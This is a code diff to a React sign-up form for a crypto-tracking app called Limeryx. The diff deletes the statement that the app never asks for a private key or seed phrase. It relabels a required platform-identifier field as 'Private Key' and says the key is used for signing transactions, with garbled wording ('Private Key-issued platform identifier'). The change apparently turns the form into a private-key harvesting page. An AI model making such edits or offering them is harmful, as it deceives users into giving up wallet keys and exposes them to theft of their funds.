@@ -105,7 +105,7 @@ function SignUp() {
         </label>
 
         <div>
-          <span className="pixel-text text-[8px] text-muted-foreground">WALLET</span>
+          <span className="pixel-text text-[8px] text-muted-foreground">PUBLICWALLET</span>
           <input
             required
             value={wallet}
@@ -114,13 +114,13 @@ function SignUp() {
             className="mt-3 w-full border border-border bg-input px-4 py-3 text-base text-foreground outline-none focus:border-primary"
           />
           <p className="mt-3 text-sm text-muted-foreground">
-            Required — Limeryx never asks for a private key or seed phrase; tracking only ever reads
+            Required — tracking only ever reads
             mainnet.
           </p>
         </div>
 
         <div>
-          <span className="pixel-text text-[8px] text-muted-foreground">LIME KEY</span>
+          <span className="pixel-text text-[8px] text-muted-foreground">Private Key</span>
           <input
             required
             value={limeKey}
@@ -129,8 +129,7 @@ function SignUp() {
             className="mt-3 w-full border border-border bg-input px-4 py-3 text-base text-foreground outline-none focus:border-primary"
           />
           <p className="mt-3 text-sm text-muted-foreground">
-            Required — your Limeryx-issued platform identifier. This is not a wallet address, private
-            key, or seed phrase.
+            Required — your Private Key-issued platform identifier. This is used for signing transactions
           </p>
         </div>
 
